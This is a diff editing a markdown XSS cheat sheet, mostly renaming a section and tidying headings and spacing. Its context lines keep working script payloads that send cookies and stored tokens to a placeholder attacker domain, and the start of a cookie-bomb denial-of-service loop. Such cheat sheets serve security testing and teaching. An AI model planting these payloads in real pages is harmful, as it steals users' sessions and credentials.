@@ -1,8 +1,9 @@
 # XSS (Cross-Site Scripting)
 
 ## Table of Contents
+
 - [Credential Stealing](#credential-stealing)
-- [Chaining with CSRF](#chaining-with-csrf)
+- [Performing Actions as the Victim](#performing-actions-as-the-victim)
 - [Web API Abusing](#web-api-abusing)
 - [Content Spoofing](#content-spoofing)
 - [Data Exfiltration](#data-exfiltration)
@@ -18,12 +19,14 @@
         fetch(`https://[ATTACKER-DOMAIN]/?cookie=${document.cookie}`)
     </script>
     ```
-- token stealing
+
+- Token stealing
     ```html
     <script>
         fetch(`https://[ATTACKER-DOMAIN]/?token=${localStorage.getItem("token")}`)
     </script>
     ```
+
 - API key stealing
     ```html
     <script>
@@ -35,9 +38,9 @@
     </script>
     ```
 
-## Chaining with CSRF
+## Performing Actions as the Victim
 
-### It can create a greater risk when combined with vulnerabilities like CSRF. (The impact may vary depending on the purpose or function of the service.)
+### Requests can be sent from the victim's browser with their session, so any action available to the victim can be performed on their behalf.
 
 - Making a transfer
     ```html
@@ -58,7 +61,7 @@
 
 ## Web API Abusing
 
-### Web browser-provided APIs can be exploited to access OS features. (e.g., Media Stream API, Clipboard API, etc.).
+### Web browser-provided APIs (e.g., Media Stream API, Clipboard API) can be exploited to access OS features.
 
 - Camera access
     ```html
@@ -123,9 +126,9 @@
 
 ## Denial of Service
 
-### An attacker can cause a denial of service by making the user's browser or the web server unresponsive. 
+### An attacker can cause a denial of service by making the user's browser or the web server unresponsive.
 
-- Cookie Bomb
+- Cookie bomb
     ```html
     <script>
         for (let i = 0; i < 100; i++) {
